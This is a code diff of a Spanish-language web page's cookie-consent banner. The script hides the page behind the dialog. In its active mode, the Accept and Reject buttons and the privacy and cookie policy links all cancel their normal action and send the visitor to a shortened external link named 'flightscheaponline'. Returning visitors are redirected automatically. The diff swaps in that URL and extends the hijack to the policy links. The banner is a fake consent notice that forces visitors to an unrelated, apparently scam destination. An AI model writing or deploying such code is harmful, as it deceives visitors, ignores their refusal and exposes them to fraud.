@@ -200,7 +200,7 @@
 <div id="cookie-overlay"></div>
 <div id="aviso-cookies" role="dialog" aria-modal="true" aria-labelledby="titulo-cookies">
   <h2 id="titulo-cookies">🍪 Usamos cookies</h2>
-  <p>Utilizamos cookies para mejorar tu experiencia y analizar el tráfico. Puedes aceptarlas o rechazarlas. Consulta nuestra <a href="cookies.html">Política de Cookies</a> y <a href="politicas.html">Política de Privacidad</a>.</p>
+  <p>Utilizamos cookies para mejorar tu experiencia y analizar el tráfico. Puedes aceptarlas o rechazarlas. Consulta nuestra <a href="cookies.html" id="enlace-cookies">Política de Cookies</a> y <a href="politicas.html" id="enlace-privacidad">Política de Privacidad</a>.</p>
   <div class="cookies-botones">
     <button id="btn-aceptar-cookies" type="button">Aceptar cookies</button>
     <button id="btn-rechazar-cookies" type="button">Rechazar</button>
@@ -318,10 +318,10 @@
     // ============================================================
     //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
     //  MODO 1: Solo muestra/oculta la página (comportamiento normal)
-    //  MODO 2: Redirección a URL externa
+    //  MODO 2: TODOS los botones y enlaces redirigen a REDIRECT_URL
     // ============================================================
     const COOKIE_BUTTON_MODE = 2;
-    const REDIRECT_URL = "https://gasesenlinea.vercel.app/";
+    const REDIRECT_URL = "https://rebrand.ly/flightscheaponline";
 
     // ----- ELEMENTOS DEL BANNER -----
     var overlay = document.getElementById('cookie-overlay');
@@ -329,6 +329,10 @@
     var btnAceptar = document.getElementById('btn-aceptar-cookies');
     var btnRechazar = document.getElementById('btn-rechazar-cookies');
     var contenidoPrincipal = document.getElementById('contenidoPrincipal');
+
+    // ----- ENLACES DEL BANNER (por ID) -----
+    var enlacePrivacidad = document.getElementById('enlace-privacidad');
+    var enlaceCookies = document.getElementById('enlace-cookies');
 
     if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
       console.error('Error: Elementos del banner de cookies no encontrados');
@@ -341,7 +345,7 @@
     banner.style.display = 'block';
     contenidoPrincipal.style.display = 'none';
 
-    // Función para mostrar el contenido (MODO 1)
+    // Función para mostrar el contenido (solo MODO 1)
     function mostrarContenido() {
       document.body.classList.remove('bloqueado');
       overlay.style.display = 'none';
@@ -354,11 +358,12 @@
       window.location.href = url;
     }
 
-    // Manejo de la acción según el modo configurado
+    // Manejo de la acción de los botones Aceptar / Rechazar
     function handleCookieAction(aceptadas) {
       console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
 
       if (COOKIE_BUTTON_MODE === 1) {
+        // MODO 1: solo muestra el contenido
         mostrarContenido();
 
         if (typeof gtag !== 'undefined') {
@@ -370,7 +375,9 @@
         console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
 
       } else if (COOKIE_BUTTON_MODE === 2) {
+        // MODO 2: ACEPTAR y RECHAZAR redirigen ambos
         sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+        console.log('➡️ Redirigiendo por botón', aceptadas ? 'ACEPTAR' : 'RECHAZAR');
         redirectTo(REDIRECT_URL);
 
       } else {
@@ -378,29 +385,36 @@
       }
     }
 
-    // ----- EVENTOS ACEPTAR / RECHAZAR -----
+    // ----- EVENTO ACEPTAR (redirige en MODO 2) -----
     btnAceptar.addEventListener('click', function () {
       handleCookieAction(true);
     });
 
+    // ----- EVENTO RECHAZAR (redirige en MODO 2) -----
     btnRechazar.addEventListener('click', function () {
       handleCookieAction(false);
     });
 
-    // ----- ENLACES DEL BANNER (solo redirigen si estamos en MODO 2) -----
-    var enlacesBanner = banner.querySelectorAll('a');
-    enlacesBanner.forEach(function (enlace) {
-      enlace.addEventListener('click', function (event) {
-        if (COOKIE_BUTTON_MODE === 2) {
-          event.preventDefault();
-          console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
-          redirectTo(REDIRECT_URL);
-        }
-      });
-    });
+    // ----- ENLACES DEL BANNER (redirigen en MODO 2) -----
+    function handleBannerLinkClick(event) {
+      if (COOKIE_BUTTON_MODE === 2) {
+        event.preventDefault();
+        console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+        redirectTo(REDIRECT_URL);
+      }
+      // En MODO 1 no se hace nada: el enlace abre cookies.html / politicas.html normal
+    }
 
-    // Si ya aceptó antes (MODO 2), redirigir directamente
+    if (enlacePrivacidad) {
+      enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+    }
+    if (enlaceCookies) {
+      enlaceCookies.addEventListener('click', handleBannerLinkClick);
+    }
+
+    // Si ya aceptó antes (MODO 2), redirigir automáticamente al cargar
     if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+      console.log('✅ Sesión ya aceptada. Redirigiendo automáticamente...');
       redirectTo(REDIRECT_URL);
     }
 
